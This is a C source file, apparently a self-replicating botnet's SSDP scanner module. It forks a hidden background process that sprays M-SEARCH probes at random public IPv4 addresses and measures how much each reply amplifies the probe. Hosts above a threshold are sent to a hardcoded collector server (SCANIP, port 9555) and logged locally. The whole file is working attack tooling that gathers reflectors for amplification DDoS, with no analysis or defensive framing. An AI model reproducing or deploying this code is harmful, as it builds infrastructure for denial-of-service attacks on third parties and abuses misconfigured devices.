#ifdef SELFREP
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include "includes.h"
#include "ssdp_scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"

int ssdp_scanner_pid = 0;
int ssdp_udp_fd = 0;
uint32_t ssdp_fake_time = 0;

static void log_event(const char *scanner, const char *event, ipv4_t ip, uint16_t port, const char *details)
{
    FILE *f = fopen("logs.txt", "a");
    if(!f) return;
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    char time_str[64];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm);
    fprintf(f, "[%s] [%s] %s %d.%d.%d.%d:%d %s\n", 
            time_str, scanner, event,
            (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff, 
            port, details ? details : "");
    fclose(f);
}

static void ssdp_report_amplifier(ipv4_t addr, uint16_t port, uint32_t amplification_factor)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in cb;
    cb.sin_family = AF_INET;
    cb.sin_addr.s_addr = SCANIP;
    cb.sin_port = htons(9555);
    if (connect(fd, (struct sockaddr *)&cb, sizeof(cb)) == -1) {
        close(fd);
        return;
    }
    uint8_t marker = 0xFF;
    uint16_t port_net = htons(port);
    uint32_t amp_factor = htonl(amplification_factor);
    send(fd, &marker, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, &addr, sizeof(ipv4_t), MSG_NOSIGNAL);
    send(fd, &port_net, sizeof(uint16_t), MSG_NOSIGNAL);
    send(fd, &amp_factor, sizeof(uint32_t), MSG_NOSIGNAL);
    close(fd);
}

static ipv4_t get_random_ssdp_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
    do
    {
        tmp = rand_next();
        o1 = (tmp % 223) + 1;
        o2 = rand_next() & 0xff;
        o3 = rand_next() & 0xff;
        o4 = rand_next() & 0xff;
        tmp = INET_ADDR(o1, o2, o3, o4);
        if(o1 == 0 || o1 == 10 || o1 == 127 || (o1 == 172 && o2 >= 16 && o2 <= 31) || (o1 == 192 && o2 == 168) || o1 >= 224)
            continue;
    } while(tmp == LOCAL_ADDR || tmp == 0 || tmp == 0xffffffff);
    return tmp;
}

static void ssdp_setup_connection(ipv4_t target_ip)
{
    if(ssdp_udp_fd == 0)
    {
        ssdp_udp_fd = socket(AF_INET, SOCK_DGRAM, 0);
        if(ssdp_udp_fd < 0) return;
        fcntl(ssdp_udp_fd, F_SETFL, O_NONBLOCK);
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = target_ip;
    addr.sin_port = htons(SSDP_PORT);
    
    const char *msearch = 
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "ST: ssdp:all\r\n"
        "MX: 3\r\n"
        "\r\n";
    
    sendto(ssdp_udp_fd, msearch, strlen(msearch), MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
}

void ssdp_scanner(void)
{
    if(ssdp_scanner_pid != 0) return;
    
    ssdp_scanner_pid = fork();
    if(ssdp_scanner_pid > 0 || ssdp_scanner_pid == -1)
        return;
    
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    
    ssdp_udp_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(ssdp_udp_fd < 0) exit(1);
    
    fcntl(ssdp_udp_fd, F_SETFL, O_NONBLOCK);
    
    struct timeval timeout;
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;
    setsockopt(ssdp_udp_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    char recv_buf[4096];
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);
    uint32_t scan_count = 0;
    
    while(1)
    {
        for(int i = 0; i < 200; i++)
        {
            ipv4_t target = get_random_ssdp_ip();
            ssdp_setup_connection(target);
        }
        scan_count += 200;
        
        int responses_processed = 0;
        while(responses_processed < 100)
        {
            fd_set read_fds;
            FD_ZERO(&read_fds);
            FD_SET(ssdp_udp_fd, &read_fds);
            
            struct timeval tv;
            tv.tv_sec = 0;
            tv.tv_usec = 50000;
            
            if(select(ssdp_udp_fd + 1, &read_fds, NULL, NULL, &tv) > 0)
            {
                if(FD_ISSET(ssdp_udp_fd, &read_fds))
                {
                    int recv_len = recvfrom(ssdp_udp_fd, recv_buf, sizeof(recv_buf) - 1, 0, (struct sockaddr *)&from, &from_len);
                    if(recv_len > 0)
                    {
                        recv_buf[recv_len] = 0;
                        ipv4_t from_ip = from.sin_addr.s_addr;
                        uint16_t from_port = ntohs(from.sin_port);
                        
                        const uint32_t msearch_len = 128;
                        uint32_t amplification = recv_len / msearch_len;
                        
                        if(amplification >= SSDP_MIN_AMPLIFICATION)
                        {
                            ssdp_report_amplifier(from_ip, from_port, amplification);
                            char amp_str[32];
                            snprintf(amp_str, sizeof(amp_str), "%ux", amplification);
                            log_event("ssdp", "amplifier_found", from_ip, from_port, amp_str);
                        }
                        responses_processed++;
                    }
                    else
                    {
                        break;
                    }
                }
                else
                {
                    break;
                }
            }
            else
            {
                break;
            }
        }
        
        if(scan_count % 10000 == 0)
        {
            #ifdef DEBUG
            printf("[ssdp_scanner] Scanned %u IPs, found amplifiers\n", scan_count);
            #endif
        }
        
        usleep(50000);
    }
}

void ssdp_kill(void)
{
    if(ssdp_scanner_pid > 0)
    {
        kill(ssdp_scanner_pid, 9);
        ssdp_scanner_pid = 0;
    }
    if(ssdp_udp_fd > 0)
    {
        close(ssdp_udp_fd);
        ssdp_udp_fd = 0;
    }
}
#endif

